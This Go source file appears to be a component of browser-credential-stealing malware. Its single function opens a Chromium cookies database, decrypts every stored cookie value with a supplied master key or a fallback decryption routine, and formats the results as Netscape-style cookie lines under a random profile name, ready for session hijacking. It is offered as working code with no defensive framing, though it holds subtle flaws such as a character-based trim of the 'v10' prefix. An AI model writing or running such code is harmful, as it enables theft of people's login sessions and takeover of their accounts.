package endpoint

import (
	"crypto/aes"
	"crypto/cipher"
	"database/sql"
	"fmt"
	"strings"

	"./random"

	_ "github.com/mattn/go-sqlite3"
)

func ChromiumCookie(pather string, masterKey []byte) []Cookies {
	txt_cook := []string{""}
	normalcook := []string{""}
	var allcooks []Cookies
	var c Cookies
	c.Profilename = random.Random()
	normalcook = []string{""}

	db_cook, err := sql.Open("sqlite3", pather)
	if err == nil {
		defer db_cook.Close()
		rows_cook, err := db_cook.Query("SELECT host_key, path, is_secure, expires_utc, name, encrypted_value FROM cookies")
		if err == nil {
			defer rows_cook.Close()
			var c Cookies
			c.Profilename = random.Random()
			for rows_cook.Next() {
				var HOST string
				var PATH string
				var ISSECURE string
				var EXPIRY int
				var NAME string
				var VALUE string

				err = rows_cook.Scan(&HOST, &PATH, &ISSECURE, &EXPIRY, &NAME, &VALUE)
				if err == nil {
					if strings.HasPrefix(VALUE, "v10") {
						VALUE = strings.Trim(VALUE, "v10")
						if string(masterKey) != "" {
							ciphertext := []byte(VALUE)
							c, err := aes.NewCipher(masterKey)
							if err == nil {
								gcm, err := cipher.NewGCM(c)
								if err == nil {

									nonceSize := gcm.NonceSize()
									if len(ciphertext) < nonceSize {
										geterr(err)
									}
									nonce, ciphertext := ciphertext[:nonceSize], ciphertext[nonceSize:]
									plaintext, err := gcm.Open(nil, nonce, ciphertext, nil)
									if err == nil {
										if string(plaintext) != "" {
											txt_cook = append(txt_cook, fmt.Sprintf("%s\tTRUE\t%s\t%s\t%d\t%s\t%s\n", HOST, PATH, ISSECURE, EXPIRY, NAME, string(plaintext)))
											normalcook = append(normalcook, fmt.Sprintf("%s\tTRUE\t%s\t%s\t%d\t%s\t%s\n", HOST, PATH, ISSECURE, EXPIRY, NAME, string(plaintext)))
										}
									}
								}
							}
						}
					} else {
						pass, err := Decrypt([]byte(VALUE))
						if err == nil {
							txt_cook = append(txt_cook, fmt.Sprintf("%s\tTRUE\t%s\t%s\t%d\t%s\t%s\n", HOST, PATH, ISSECURE, EXPIRY, NAME, string(pass)))
							normalcook = append(normalcook, fmt.Sprintf("%s\tTRUE\t%s\t%s\t%d\t%s\t%s\n", HOST, PATH, ISSECURE, EXPIRY, NAME, string(pass)))
						}
					}
				}
			}
		}
	}
	c.Cookies = append(c.Cookies, normalcook...)
	allcooks = append(allcooks, c)

	return allcooks
}

type Cookies struct {
	Profilename string
	Cookies     []string
}
